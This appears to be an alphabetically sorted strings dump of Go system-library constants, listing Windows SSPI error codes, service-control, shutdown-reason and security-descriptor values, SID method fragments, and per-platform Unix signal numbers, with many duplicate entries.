SEC_E_CANNOT_PACK                                                         Handle        = 0x80090309
SEC_E_CERT_EXPIRED                                                        Handle        = 0x80090328
SEC_E_CERT_UNKNOWN                                                        Handle        = 0x80090327
SEC_E_CERT_WRONG_USAGE                                                    Handle        = 0x80090349
SEC_E_CONTEXT_EXPIRED                                                     Handle        = 0x80090317
SEC_E_CROSSREALM_DELEGATION_FAILURE                                       Handle        = 0x80090357
SEC_E_CRYPTO_SYSTEM_INVALID                                               Handle        = 0x80090337
SEC_E_DECRYPT_FAILURE                                                     Handle        = 0x80090330
SEC_E_DELEGATION_POLICY                                                   Handle        = 0x8009035E
SEC_E_DELEGATION_REQUIRED                                                 Handle        = 0x80090345
SEC_E_DOWNGRADE_DETECTED                                                  Handle        = 0x80090350
SEC_E_ENCRYPT_FAILURE                                                     Handle        = 0x80090329
SEC_E_EXT_BUFFER_TOO_SMALL                                                Handle        = 0x8009036A
SEC_E_ILLEGAL_MESSAGE                                                     Handle        = 0x80090326
SEC_E_INCOMPLETE_CREDENTIALS                                              Handle        = 0x80090320
SEC_E_INCOMPLETE_MESSAGE                                                  Handle        = 0x80090318
SEC_E_INSUFFICIENT_BUFFERS                                                Handle        = 0x8009036B
SEC_E_INSUFFICIENT_MEMORY                                                 Handle        = 0x80090300
SEC_E_INTERNAL_ERROR                                                      Handle        = 0x80090304
SEC_E_INVALID_HANDLE                                                      Handle        = 0x80090301
SEC_E_INVALID_PARAMETER                                                   Handle        = 0x8009035D
SEC_E_INVALID_TOKEN                                                       Handle        = 0x80090308
SEC_E_INVALID_UPN_NAME                                                    Handle        = 0x80090369
SEC_E_ISSUING_CA_UNTRUSTED                                                Handle        = 0x80090352
SEC_E_ISSUING_CA_UNTRUSTED_KDC                                            Handle        = 0x80090359
SEC_E_KDC_CERT_EXPIRED                                                    Handle        = 0x8009035A
SEC_E_KDC_CERT_REVOKED                                                    Handle        = 0x8009035B
SEC_E_KDC_INVALID_REQUEST                                                 Handle        = 0x80090340
SEC_E_KDC_UNABLE_TO_REFER                                                 Handle        = 0x80090341
SEC_E_KDC_UNKNOWN_ETYPE                                                   Handle        = 0x80090342
SEC_E_LOGON_DENIED                                                        Handle        = 0x8009030C
SEC_E_MAX_REFERRALS_EXCEEDED                                              Handle        = 0x80090338
SEC_E_MESSAGE_ALTERED                                                     Handle        = 0x8009030F
SEC_E_MULTIPLE_ACCOUNTS                                                   Handle        = 0x80090347
SEC_E_MUST_BE_KDC                                                         Handle        = 0x80090339
SEC_E_MUTUAL_AUTH_FAILED                                                  Handle        = 0x80090363
SEC_E_NOT_OWNER                                                           Handle        = 0x80090306
SEC_E_NOT_SUPPORTED                                                                     = SEC_E_UNSUPPORTED_FUNCTION
SEC_E_NO_AUTHENTICATING_AUTHORITY                                         Handle        = 0x80090311
SEC_E_NO_CONTEXT                                                          Handle        = 0x80090361
SEC_E_NO_CREDENTIALS                                                      Handle        = 0x8009030E
SEC_E_NO_IMPERSONATION                                                    Handle        = 0x8009030B
SEC_E_NO_IP_ADDRESSES                                                     Handle        = 0x80090335
SEC_E_NO_KERB_KEY                                                         Handle        = 0x80090348
SEC_E_NO_PA_DATA                                                          Handle        = 0x8009033C
SEC_E_NO_S4U_PROT_SUPPORT                                                 Handle        = 0x80090356
SEC_E_NO_SPM                                                                            = SEC_E_INTERNAL_ERROR
SEC_E_NO_TGT_REPLY                                                        Handle        = 0x80090334
SEC_E_OK                                                                  Handle        = 0x00000000
SEC_E_ONLY_HTTPS_ALLOWED                                                  Handle        = 0x80090365
SEC_E_OUT_OF_SEQUENCE                                                     Handle        = 0x80090310
SEC_E_PKINIT_CLIENT_FAILURE                                               Handle        = 0x80090354
SEC_E_PKINIT_NAME_MISMATCH                                                Handle        = 0x8009033D
SEC_E_PKU2U_CERT_FAILURE                                                  Handle        = 0x80090362
SEC_E_POLICY_NLTM_ONLY                                                    Handle        = 0x8009035F
SEC_E_QOP_NOT_SUPPORTED                                                   Handle        = 0x8009030A
SEC_E_REVOCATION_OFFLINE_C                                                Handle        = 0x80090353
SEC_E_REVOCATION_OFFLINE_KDC                                              Handle        = 0x80090358
SEC_E_SECPKG_NOT_FOUND                                                    Handle        = 0x80090305
SEC_E_SECURITY_QOS_FAILED                                                 Handle        = 0x80090332
SEC_E_SHUTDOWN_IN_PROGRESS                                                Handle        = 0x8009033F
SEC_E_SMARTCARD_CERT_EXPIRED                                              Handle        = 0x80090355
SEC_E_SMARTCARD_CERT_REVOKED                                              Handle        = 0x80090351
SEC_E_SMARTCARD_LOGON_REQUIRED                                            Handle        = 0x8009033E
SEC_E_STRONG_CRYPTO_NOT_SUPPORTED                                         Handle        = 0x8009033A
SEC_E_TARGET_UNKNOWN                                                      Handle        = 0x80090303
SEC_E_TIME_SKEW                                                           Handle        = 0x80090324
SEC_E_TOO_MANY_PRINCIPALS                                                 Handle        = 0x8009033B
SEC_E_UNFINISHED_CONTEXT_DELETED                                          Handle        = 0x80090333
SEC_E_UNKNOWN_CREDENTIALS                                                 Handle        = 0x8009030D
SEC_E_UNSUPPORTED_FUNCTION                                                Handle        = 0x80090302
SEC_E_UNSUPPORTED_PREAUTH                                                 Handle        = 0x80090343
SEC_E_UNTRUSTED_ROOT                                                      Handle        = 0x80090325
SEC_E_WRONG_CREDENTIAL_HANDLE                                             Handle        = 0x80090336
SEC_E_WRONG_PRINCIPAL                                                     Handle        = 0x80090322
SEC_I_ASYNC_CALL_PENDING                                                  Handle        = 0x00090368
SEC_I_COMPLETE_AND_CONTINUE                                               Handle        = 0x00090314
SEC_I_COMPLETE_NEEDED                                                     Handle        = 0x00090313
SEC_I_CONTEXT_EXPIRED                                                     Handle        = 0x00090317
SEC_I_CONTINUE_NEEDED                                                     Handle        = 0x00090312
SEC_I_CONTINUE_NEEDED_MESSAGE_OK                                          Handle        = 0x00090366
SEC_I_GENERIC_EXTENSION_RECEIVED                                          Handle        = 0x00090316
SEC_I_INCOMPLETE_CREDENTIALS                                              Handle        = 0x00090320
SEC_I_LOCAL_LOGON                                                         Handle        = 0x00090315
SEC_I_MESSAGE_FRAGMENT                                                    Handle        = 0x00090364
SEC_I_NO_LSA_CONTEXT                                                      Handle        = 0x00090323
SEC_I_NO_RENEGOTIATION                                                    Handle        = 0x00090360
SEC_I_RENEGOTIATE                                                         Handle        = 0x00090321
SEC_I_SIGNATURE_NEEDED                                                    Handle        = 0x0009035C
SEEK_/ 
SEEK_CUR                                    = 0x1
SEEK_CUR                                = 0x1
SEEK_CUR                        = 1
SEEK_CUR                       = 0x1
SEEK_DATA                                   = 0x3
SEEK_DATA                               = 0x4
SEEK_DATA                      = 0x3
SEEK_END                                    = 0x2
SEEK_END                                = 0x2
SEEK_END                        = 2
SEEK_END                       = 0x2
SEEK_HOLE                                   = 0x4
SEEK_HOLE                               = 0x3
SEEK_HOLE                      = 0x4
SEEK_MAX                                    = 0x4
SEEK_SET                                    = 0x0
SEEK_SET                                = 0x0
SEEK_SET                        = 0
SEEK_SET                       = 0x0
SELINUX_MAGIC                               = 0xf97cff8c
SEMAPHORE_ALL_ACCESS   = STANDARD_RIGHTS_REQUIRED 
SEMAPHORE_MODIFY_STATE = 0x0002
SEM_FAILCRITICALERRORS     = 0x0001
SEM_NOALIGNMENTFAULTEXCEPT = 0x0004
SEM_NOGPFAULTERRORBOX      = 0x0002
SEM_NOOPENFILEERRORBOX     = 0x8000
SERVICE_ACCEPT_HARDWAREPROFILECHANGE = 32
SERVICE_ACCEPT_NETBINDCHANGE         = 16
SERVICE_ACCEPT_PARAMCHANGE           = 8
SERVICE_ACCEPT_PAUSE_CONTINUE        = 2
SERVICE_ACCEPT_POWEREVENT            = 64
SERVICE_ACCEPT_PRESHUTDOWN           = 256
SERVICE_ACCEPT_SESSIONCHANGE         = 128
SERVICE_ACCEPT_SHUTDOWN              = 4
SERVICE_ACCEPT_STOP                  = 1
SERVICE_ACTIVE    = 1
SERVICE_ADAPTER             = 4
SERVICE_ALL_ACCESS           = STANDARD_RIGHTS_REQUIRED 
SERVICE_AUTO_START   = 2
SERVICE_BOOT_START   = 0
SERVICE_CHANGE_CONFIG        = 2
SERVICE_CONFIG_DELAYED_AUTO_START_INFO  = 3
SERVICE_CONFIG_DESCRIPTION              = 1
SERVICE_CONFIG_FAILURE_ACTIONS          = 2
SERVICE_CONFIG_FAILURE_ACTIONS_FLAG     = 4
SERVICE_CONFIG_LAUNCH_PROTECTED         = 12
SERVICE_CONFIG_PREFERRED_NODE           = 9
SERVICE_CONFIG_PRESHUTDOWN_INFO         = 7
SERVICE_CONFIG_REQUIRED_PRIVILEGES_INFO = 6
SERVICE_CONFIG_SERVICE_SID_INFO         = 5
SERVICE_CONFIG_TRIGGER_INFO             = 8
SERVICE_CONTINUE_PENDING = 5
SERVICE_CONTROL_CONTINUE              = 3
SERVICE_CONTROL_DEVICEEVENT           = 11
SERVICE_CONTROL_HARDWAREPROFILECHANGE = 12
SERVICE_CONTROL_INTERROGATE           = 4
SERVICE_CONTROL_NETBINDADD            = 7
SERVICE_CONTROL_NETBINDDISABLE        = 10
SERVICE_CONTROL_NETBINDENABLE         = 9
SERVICE_CONTROL_NETBINDREMOVE         = 8
SERVICE_CONTROL_PARAMCHANGE           = 6
SERVICE_CONTROL_PAUSE                 = 2
SERVICE_CONTROL_POWEREVENT            = 13
SERVICE_CONTROL_PRESHUTDOWN           = 15
SERVICE_CONTROL_SESSIONCHANGE         = 14
SERVICE_CONTROL_SHUTDOWN              = 5
SERVICE_CONTROL_STOP                  = 1
SERVICE_DEMAND_START = 3
SERVICE_DISABLED     = 4
SERVICE_DRIVER              = SERVICE_KERNEL_DRIVER 
SERVICE_DYNAMIC_INFORMATION_LEVEL_START_REASON = 1
SERVICE_ENUMERATE_DEPENDENTS = 8
SERVICE_ERROR_CRITICAL = 3
SERVICE_ERROR_IGNORE   = 0
SERVICE_ERROR_NORMAL   = 1
SERVICE_ERROR_SEVERE   = 2
SERVICE_FILE_SYSTEM_DRIVER  = 2
SERVICE_INACTIVE  = 2
SERVICE_INTERACTIVE_PROCESS = 256
SERVICE_INTERROGATE          = 128
SERVICE_KERNEL_DRIVER       = 1
SERVICE_NOTIFY) (ret error) = advapi32.NotifyServiceStatusChangeW
SERVICE_NOTIFY) (ret error) {
SERVICE_NOTIFY_CONTINUE_PENDING = 0x00000010
SERVICE_NOTIFY_CREATED          = 0x00000080
SERVICE_NOTIFY_DELETED          = 0x00000100
SERVICE_NOTIFY_DELETE_PENDING   = 0x00000200
SERVICE_NOTIFY_PAUSED           = 0x00000040
SERVICE_NOTIFY_PAUSE_PENDING    = 0x00000020
SERVICE_NOTIFY_RUNNING          = 0x00000008
SERVICE_NOTIFY_START_PENDING    = 0x00000002
SERVICE_NOTIFY_STATUS_CHANGE    = 2
SERVICE_NOTIFY_STOPPED          = 0x00000001
SERVICE_NOTIFY_STOP_PENDING     = 0x00000004
SERVICE_NO_CHANGE        = 0xffffffff
SERVICE_PAUSED           = 7
SERVICE_PAUSE_CONTINUE       = 64
SERVICE_PAUSE_PENDING    = 6
SERVICE_QUERY_CONFIG         = 1
SERVICE_QUERY_STATUS         = 4
SERVICE_RECOGNIZER_DRIVER   = 8
SERVICE_RUNNING          = 4
SERVICE_RUNS_IN_SYSTEM_PROCESS = 1
SERVICE_SID_TYPE_NONE         = 0
SERVICE_SID_TYPE_RESTRICTED   = 2 
SERVICE_SID_TYPE_UNRESTRICTED = 1
SERVICE_START                = 16
SERVICE_START_PENDING    = 2
SERVICE_START_REASON_AUTO               = 0x00000002
SERVICE_START_REASON_DELAYEDAUTO        = 0x00000010
SERVICE_START_REASON_DEMAND             = 0x00000001
SERVICE_START_REASON_RESTART_ON_FAILURE = 0x00000008
SERVICE_START_REASON_TRIGGER            = 0x00000004
SERVICE_STATE_ALL = 3
SERVICE_STATUS) (err error) = advapi32.ControlService
SERVICE_STATUS) (err error) = advapi32.QueryServiceStatus
SERVICE_STATUS) (err error) = advapi32.SetServiceStatus
SERVICE_STATUS) (err error) {
SERVICE_STOP                 = 32
SERVICE_STOPPED          = 1
SERVICE_STOP_PENDING     = 3
SERVICE_SYSTEM_START = 1
SERVICE_TABLE_ENTRY) (err error) = advapi32.StartServiceCtrlDispatcherW
SERVICE_TABLE_ENTRY) (err error) {
SERVICE_TYPE_ALL            = SERVICE_WIN32 
SERVICE_USER_DEFINED_CONTROL = 256
SERVICE_WIN32               = SERVICE_WIN32_OWN_PROCESS 
SERVICE_WIN32_OWN_PROCESS   = 16
SERVICE_WIN32_SHARE_PROCESS = 32
SET$
SET)_/ 
SETAUTOCVTALL                   = 5
SETAUTOCVTON                    = 2
SETCVTALL                       = 4
SETCVTOFF                       = 0
SETCVTON                        = 1
SET_ACCESS        = 2
SET_AUDIT_FAILURE = 6
SET_AUDIT_SUCCESS = 5
SEVERITY_ERROR                                                            syscall.Errno = 1
SEVERITY_SUCCESS                                                          syscall.Errno = 0
SE_DACL_AUTO_INHERITED   = 0x0400
SE_DACL_AUTO_INHERIT_REQ = 0x0100
SE_DACL_DEFAULTED        = 0x0008
SE_DACL_PRESENT          = 0x0004
SE_DACL_PROTECTED        = 0x1000
SE_DS_OBJECT               = 8
SE_DS_OBJECT_ALL           = 9
SE_FILE_OBJECT             = 1
SE_GROUP_DEFAULTED       = 0x0002
SE_GROUP_ENABLED            = 0x00000004
SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
SE_GROUP_INTEGRITY          = 0x00000020
SE_GROUP_INTEGRITY_ENABLED  = 0x00000040
SE_GROUP_LOGON_ID           = 0xC0000000
SE_GROUP_MANDATORY          = 0x00000001
SE_GROUP_OWNER              = 0x00000008
SE_GROUP_RESOURCE           = 0x20000000
SE_GROUP_USE_FOR_DENY_ONLY  = 0x00000010
SE_GROUP_VALID_ATTRIBUTES   = SE_GROUP_MANDATORY 
SE_KERNEL_OBJECT           = 6
SE_LMSHARE                 = 5
SE_OWNER_DEFAULTED       = 0x0001
SE_PRINTER                 = 3
SE_PRIVILEGE_ENABLED            = 0x00000002
SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
SE_PRIVILEGE_REMOVED            = 0x00000004
SE_PRIVILEGE_USED_FOR_ACCESS    = 0x80000000
SE_PRIVILEGE_VALID_ATTRIBUTES   = SE_PRIVILEGE_ENABLED_BY_DEFAULT 
SE_PROVIDER_DEFINED_OBJECT = 10
SE_REGISTRY_KEY            = 4
SE_REGISTRY_WOW64_32KEY    = 12
SE_REGISTRY_WOW64_64KEY    = 13
SE_RM_CONTROL_VALID      = 0x4000
SE_SACL_AUTO_INHERITED   = 0x0800
SE_SACL_AUTO_INHERIT_REQ = 0x0200
SE_SACL_DEFAULTED        = 0x0020
SE_SACL_PRESENT          = 0x0010
SE_SACL_PROTECTED        = 0x2000
SE_SELF_RELATIVE         = 0x8000
SE_SELF_RELATIVE != 0 {
SE_SELF_RELATIVE == 0 {
SE_SERVICE                 = 2
SE_UNKNOWN_OBJECT_TYPE     = 0
SE_WINDOW_OBJECT           = 7
SE_WMIGUID_OBJECT          = 11
SFD_CLOEXEC                      = 0x400000
SFD_CLOEXEC                      = 0x80000
SFD_NONBLOCK                     = 0x4000
SFD_NONBLOCK                     = 0x80
SFD_NONBLOCK                     = 0x800
SF_CLOSE                        = 0x00000002
SF_REUSE                        = 0x00000001
SH$)/ 
SHM_RDONLY = 0x1000
SHM_RND    = 0x2000
SHOWCOMPRESSION)/ 
SHTDN_REASON_FLAG_CLEAN_UI                  = 0x04000000
SHTDN_REASON_FLAG_COMMENT_REQUIRED          = 0x01000000
SHTDN_REASON_FLAG_DIRTY_PROBLEM_ID_REQUIRED = 0x02000000
SHTDN_REASON_FLAG_DIRTY_UI                  = 0x08000000
SHTDN_REASON_FLAG_PLANNED                   = 0x80000000
SHTDN_REASON_FLAG_USER_DEFINED              = 0x40000000
SHTDN_REASON_LEGACY_API                     = SHTDN_REASON_MAJOR_LEGACY_API 
SHTDN_REASON_MAJOR_APPLICATION              = 0x00040000
SHTDN_REASON_MAJOR_HARDWARE                 = 0x00010000
SHTDN_REASON_MAJOR_LEGACY_API               = 0x00070000
SHTDN_REASON_MAJOR_NONE                     = 0x00000000
SHTDN_REASON_MAJOR_OPERATINGSYSTEM          = 0x00020000
SHTDN_REASON_MAJOR_OTHER                    = 0x00000000
SHTDN_REASON_MAJOR_POWER                    = 0x00060000
SHTDN_REASON_MAJOR_SOFTWARE                 = 0x00030000
SHTDN_REASON_MAJOR_SYSTEM                   = 0x00050000
SHTDN_REASON_MINOR_BLUESCREEN               = 0x0000000F
SHTDN_REASON_MINOR_CORDUNPLUGGED            = 0x0000000b
SHTDN_REASON_MINOR_DC_DEMOTION              = 0x00000022
SHTDN_REASON_MINOR_DC_PROMOTION             = 0x00000021
SHTDN_REASON_MINOR_DISK                     = 0x00000007
SHTDN_REASON_MINOR_ENVIRONMENT              = 0x0000000c
SHTDN_REASON_MINOR_HARDWARE_DRIVER          = 0x0000000d
SHTDN_REASON_MINOR_HOTFIX                   = 0x00000011
SHTDN_REASON_MINOR_HOTFIX_UNINSTALL         = 0x00000017
SHTDN_REASON_MINOR_HUNG                     = 0x00000005
SHTDN_REASON_MINOR_INSTALLATION             = 0x00000002
SHTDN_REASON_MINOR_MAINTENANCE              = 0x00000001
SHTDN_REASON_MINOR_MMC                      = 0x00000019
SHTDN_REASON_MINOR_NETWORKCARD              = 0x00000009
SHTDN_REASON_MINOR_NETWORK_CONNECTIVITY     = 0x00000014
SHTDN_REASON_MINOR_NONE                     = 0x000000ff
SHTDN_REASON_MINOR_OTHER                    = 0x00000000
SHTDN_REASON_MINOR_OTHERDRIVER              = 0x0000000e
SHTDN_REASON_MINOR_POWER_SUPPLY             = 0x0000000a
SHTDN_REASON_MINOR_PROCESSOR                = 0x00000008
SHTDN_REASON_MINOR_RECONFIG                 = 0x00000004
SHTDN_REASON_MINOR_SECURITY                 = 0x00000013
SHTDN_REASON_MINOR_SECURITYFIX              = 0x00000012
SHTDN_REASON_MINOR_SECURITYFIX_UNINSTALL    = 0x00000018
SHTDN_REASON_MINOR_SERVICEPACK              = 0x00000010
SHTDN_REASON_MINOR_SERVICEPACK_UNINSTALL    = 0x00000016
SHTDN_REASON_MINOR_SYSTEMRESTORE            = 0x0000001a
SHTDN_REASON_MINOR_TERMSRV                  = 0x00000020
SHTDN_REASON_MINOR_UNSTABLE                 = 0x00000006
SHTDN_REASON_MINOR_UPGRADE                  = 0x00000003
SHTDN_REASON_MINOR_WMI                      = 0x00000015
SHTDN_REASON_UNKNOWN                        = SHTDN_REASON_MINOR_NONE
SHTDN_REASON_VALID_BIT_MASK                 = 0xc0ffffff
SHUT
SHUTDOWN_NORETRY = 0x1
SHUT_RD                                     = 0x0
SHUT_RD                                 = 0x0
SHUT_RD                           = 0x0
SHUT_RD                         = 0
SHUT_RD                        = 0x0
SHUT_RD                       = 0x0
SHUT_RD   = 0
SHUT_RDWR                                   = 0x2
SHUT_RDWR                               = 0x2
SHUT_RDWR                         = 0x2
SHUT_RDWR                       = 2
SHUT_RDWR                      = 0x2
SHUT_RDWR                     = 0x2
SHUT_RDWR = 2
SHUT_WR                                     = 0x1
SHUT_WR                                 = 0x1
SHUT_WR                           = 0x1
SHUT_WR                         = 1
SHUT_WR                        = 0x1
SHUT_WR                       = 0x1
SHUT_WR   = 1
SID    uint16
SID) (
SID) (authority 
SID) (count 
SID) (err error) = advapi32.AllocateAndInitializeSid
SID) (err error) = advapi32.ConvertStringSidToSidW
SID) (err error) = advapi32.CopySid
SID) (err error) [failretval!=0] = advapi32.FreeSid
SID) (err error) {
SID) (isEqual bool) = advapi32.EqualSid
SID) (isEqual bool) {
SID) (isValid bool) = advapi32.IsValidSid
SID) (isValid bool) {
SID) (len uint32) = advapi32.GetLengthSid
SID) (len uint32) {
SID) Copy() (
SID) Equals(sid2 
SID) IdentifierAuthority() SidIdentifierAuthority {
SID) IsValid() bool {
SID) IsWellKnown(sidType WELL_KNOWN_SID_TYPE) bool {
SID) Len() int {
SID) String() string {
SID) SubAuthority(idx uint32) uint32 {
SID) SubAuthorityCount() uint8 {
SID) TrusteeValue {
SID) bool {
SID)(unsafe.Pointer(
SIG2STR_MAX                   = 0x20
SIGABND   = Signal(18)
SIGABRT     = syscall.Signal(0x6)
SIGABRT    = syscall.Signal(0x6)
SIGABRT   = Signal(3)
SIGABRT   = syscall.Signal(0x6)
SIGABRT = Signal(0x6)
SIGABRT = syscall.Signal(0x6)
SIGAIO      = syscall.Signal(0x17)
SIGALRM     = syscall.Signal(0xe)
SIGALRM    = syscall.Signal(0xe)
SIGALRM   = Signal(14)
SIGALRM   = syscall.Signal(0xe)
SIGALRM = Signal(0xe)
SIGALRM = syscall.Signal(0xe)
SIGALRM1    = syscall.Signal(0x26)
SIGBUS      = syscall.Signal(0xa)
SIGBUS     = syscall.Signal(0xa)
SIGBUS    = Signal(10)
SIGBUS    = syscall.Signal(0x7)
SIGBUS    = syscall.Signal(0xa)
SIGBUS  = Signal(0x7)
SIGCANCEL  = syscall.Signal(0x24)
SIGCAPI     = syscall.Signal(0x31)
SIGCHLD     = syscall.Signal(0x14)
SIGCHLD    = syscall.Signal(0x12)
SIGCHLD   = Signal(20)
SIGCHLD   = syscall.Signal(0x11)
SIGCHLD   = syscall.Signal(0x12)
SIGCHLD   = syscall.Signal(0x14)
SIGCKPT     = syscall.Signal(0x21)
SIGCKPTEXIT = syscall.Signal(0x22)
SIGCLD      = syscall.Signal(0x14)
SIGCLD     = syscall.Signal(0x12)
SIGCLD    = syscall.Signal(0x11)
SIGCLD    = syscall.Signal(0x12)
SIGCLD    = syscall.Signal(0x14)
SIGCONT     = syscall.Signal(0x13)
SIGCONT    = syscall.Signal(0x19)
SIGCONT   = Signal(19)
SIGCONT   = syscall.Signal(0x12)
SIGCONT   = syscall.Signal(0x13)
SIGCONT   = syscall.Signal(0x19)
SIGCPUFAIL  = syscall.Signal(0x3b)
SIGDANGER   = syscall.Signal(0x21)
SIGDANGER = Signal(33)
SIGDCE    = Signal(38)
SIGDUMP   = Signal(39)
SIGEMT      = syscall.Signal(0x7)
SIGEMT     = syscall.Signal(0x7)
SIGEMT    = syscall.Signal(0x7)
SIGFPE      = syscall.Signal(0x8)
SIGFPE     = syscall.Signal(0x8)
SIGFPE    = Signal(8)
SIGFPE    = syscall.Signal(0x8)
SIGFPE  = Signal(0x8)
SIGFPE  = syscall.Signal(0x8)
SIGFREEZE  = syscall.Signal(0x22)
SIGGRANT    = syscall.Signal(0x3c)
SIGHUP      = syscall.Signal(0x1)
SIGHUP     = syscall.Signal(0x1)
SIGHUP    = Signal(1)
SIGHUP    = syscall.Signal(0x1)
SIGHUP  = Signal(0x1)
SIGHUP  = syscall.Signal(0x1)
SIGILL      = syscall.Signal(0x4)
SIGILL     = syscall.Signal(0x4)
SIGILL    = Signal(4)
SIGILL    = syscall.Signal(0x4)
SIGILL  = Signal(0x4)
SIGILL  = syscall.Signal(0x4)
SIGINFO     = syscall.Signal(0x1d)
SIGINFO    = syscall.Signal(0x29)
SIGINFO   = syscall.Signal(0x1d)
SIGINT      = syscall.Signal(0x2)
SIGINT     = syscall.Signal(0x2)
SIGINT    = Signal(2)
SIGINT    = syscall.Signal(0x2)
SIGINT  = Signal(0x2)
SIGINT  = syscall.Signal(0x2)
SIGIO       = syscall.Signal(0x17)
SIGIO      = syscall.Signal(0x16)
SIGIO     = Signal(23)
SIGIO     = syscall.Signal(0x16)
SIGIO     = syscall.Signal(0x17)
SIGIO     = syscall.Signal(0x1d)
SIGIOERR  = Signal(27)
SIGIOINT    = syscall.Signal(0x10)
SIGIOT      = syscall.Signal(0x6)
SIGIOT     = syscall.Signal(0x6)
SIGIOT    = syscall.Signal(0x6)
SIGIOT  = syscall.Signal(0x6)
SIGJVM1    = syscall.Signal(0x27)
SIGJVM2    = syscall.Signal(0x28)
SIGKAP      = syscall.Signal(0x3c)
SIGKILL     = syscall.Signal(0x9)
SIGKILL    = syscall.Signal(0x9)
SIGKILL   = Signal(9)
SIGKILL   = syscall.Signal(0x9)
SIGKILL = Signal(0x9)
SIGKILL = syscall.Signal(0x9)
SIGLIBRT  = syscall.Signal(0x21)
SIGLOST     = syscall.Signal(0x6)
SIGLOST    = syscall.Signal(0x25)
SIGLOST   = syscall.Signal(0x1d)
SIGLWP     = syscall.Signal(0x21)
SIGLWP    = syscall.Signal(0x20)
SIGMAX      = syscall.Signal(0x3f)
SIGMAX      = syscall.Signal(0xff)
SIGMAX32    = syscall.Signal(0x3f)
SIGMAX64                      = 0xff
SIGMAX64)' 
SIGMIGRATE  = syscall.Signal(0x23)
SIGMSG      = syscall.Signal(0x1b)
SIGPENDING
SIGPIPE     = syscall.Signal(0xd)
SIGPIPE    = syscall.Signal(0xd)
SIGPIPE   = Signal(13)
SIGPIPE   = syscall.Signal(0xd)
SIGPIPE = Signal(0xd)
SIGPIPE = syscall.Signal(0xd)
SIGPOLL     = syscall.Signal(0x17)
SIGPOLL    = syscall.Signal(0x16)
SIGPOLL   = Signal(5)
SIGPOLL   = syscall.Signal(0x16)
SIGPOLL   = syscall.Signal(0x17)
SIGPOLL   = syscall.Signal(0x1d)
SIGPRE      = syscall.Signal(0x24)
SIGPROF     = syscall.Signal(0x1b)
SIGPROF     = syscall.Signal(0x20)
SIGPROF    = syscall.Signal(0x1d)
SIGPROF   = Signal(32)
SIGPROF   = syscall.Signal(0x1b)
SIGPROF   = syscall.Signal(0x1d)
SIGPTY      = syscall.Signal(0x17)
SIGPWR      = syscall.Signal(0x1d)
SIGPWR     = syscall.Signal(0x13)
SIGPWR    = syscall.Signal(0x13)
SIGPWR    = syscall.Signal(0x1d)
SIGPWR    = syscall.Signal(0x1e)
SIGPWR    = syscall.Signal(0x20)
SIGQUEUE_MAX                  = 0x20
SIGQUIT     = syscall.Signal(0x3)
SIGQUIT    = syscall.Signal(0x3)
SIGQUIT   = Signal(24)
SIGQUIT   = syscall.Signal(0x3)
SIGQUIT = Signal(0x3)
SIGQUIT = syscall.Signal(0x3)
SIGRECONFIG = syscall.Signal(0x3a)
SIGRETRACT  = syscall.Signal(0x3d)
SIGRT
SIGRT(MIN
SIGRT)' 
SIGSAK      = syscall.Signal(0x3f)
SIGSEGV     = syscall.Signal(0xb)
SIGSEGV    = syscall.Signal(0xb)
SIGSEGV   = Signal(11)
SIGSEGV   = syscall.Signal(0xb)
SIGSEGV = Signal(0xb)
SIGSEGV = syscall.Signal(0xb)
SIGSOUND    = syscall.Signal(0x3e)
SIGSTKFLT = syscall.Signal(0x10)
SIGSTKSZ
SIGSTOP     = syscall.Signal(0x11)
SIGSTOP    = syscall.Signal(0x17)
SIGSTOP   = Signal(7)
SIGSTOP   = syscall.Signal(0x11)
SIGSTOP   = syscall.Signal(0x13)
SIGSTOP   = syscall.Signal(0x17)
SIGSYS      = syscall.Signal(0xc)
SIGSYS     = syscall.Signal(0xc)
SIGSYS    = Signal(12)
SIGSYS    = syscall.Signal(0x1f)
SIGSYS    = syscall.Signal(0xc)
SIGSYSERROR = syscall.Signal(0x30)
SIGTALRM    = syscall.Signal(0x26)
SIGTERM     = syscall.Signal(0xf)
SIGTERM    = syscall.Signal(0xf)
SIGTERM   = Signal(15)
SIGTERM   = syscall.Signal(0xf)
SIGTERM = Signal(0xf)
SIGTERM = syscall.Signal(0xf)
SIGTHAW    = syscall.Signal(0x23)
SIGTHCONT = Signal(35)
SIGTHR      = syscall.Signal(0x20)
SIGTHR    = syscall.Signal(0x20)
SIGTHSTOP = Signal(34)
SIGTRACE  = Signal(37)
SIGTRAP     = syscall.Signal(0x5)
SIGTRAP    = syscall.Signal(0x5)
SIGTRAP   = Signal(26)
SIGTRAP   = syscall.Signal(0x5)
SIGTRAP = Signal(0x5)
SIGTRAP = syscall.Signal(0x5)
SIGTSTP     = syscall.Signal(0x12)
SIGTSTP    = syscall.Signal(0x18)
SIGTSTP   = Signal(25)
SIGTSTP   = syscall.Signal(0x12)
SIGTSTP   = syscall.Signal(0x14)
SIGTSTP   = syscall.Signal(0x18)
SIGTTIN     = syscall.Signal(0x15)
SIGTTIN    = syscall.Signal(0x1a)
SIGTTIN   = Signal(21)
SIGTTIN   = syscall.Signal(0x15)
SIGTTIN   = syscall.Signal(0x1a)
SIGTTOU     = syscall.Signal(0x16)
SIGTTOU    = syscall.Signal(0x1b)
SIGTTOU   = Signal(22)
SIGTTOU   = syscall.Signal(0x16)
SIGTTOU   = syscall.Signal(0x1b)
SIGURG      = syscall.Signal(0x10)
SIGURG     = syscall.Signal(0x15)
SIGURG    = Signal(6)
SIGURG    = syscall.Signal(0x10)
SIGURG    = syscall.Signal(0x15)
SIGURG    = syscall.Signal(0x17)
SIGUSR1     = syscall.Signal(0x1e)
SIGUSR1    = syscall.Signal(0x10)
SIGUSR1   = Signal(16)
SIGUSR1   = syscall.Signal(0x10)
SIGUSR1   = syscall.Signal(0x1e)
SIGUSR1   = syscall.Signal(0xa)
SIGUSR2     = syscall.Signal(0x1f)
SIGUSR2    = syscall.Signal(0x11)
SIGUSR2   = Signal(17)
SIGUSR2   = syscall.Signal(0x11)
SIGUSR2   = syscall.Signal(0x1f)
SIGUSR2   = syscall.Signal(0xc)
SIGVIRT     = syscall.Signal(0x25)
SIGVTALRM   = syscall.Signal(0x1a)
SIGVTALRM   = syscall.Signal(0x22)
SIGVTALRM  = syscall.Signal(0x1c)
SIGVTALRM = Signal(31)
SIGVTALRM = syscall.Signal(0x1a)
SIGVTALRM = syscall.Signal(0x1c)
SIGWAITING  = syscall.Signal(0x27)
SIGWAITING = syscall.Signal(0x20)
SIGWINCH    = syscall.Signal(0x1c)
SIGWINCH   = syscall.Signal(0x14)
SIGWINCH  = Signal(28)
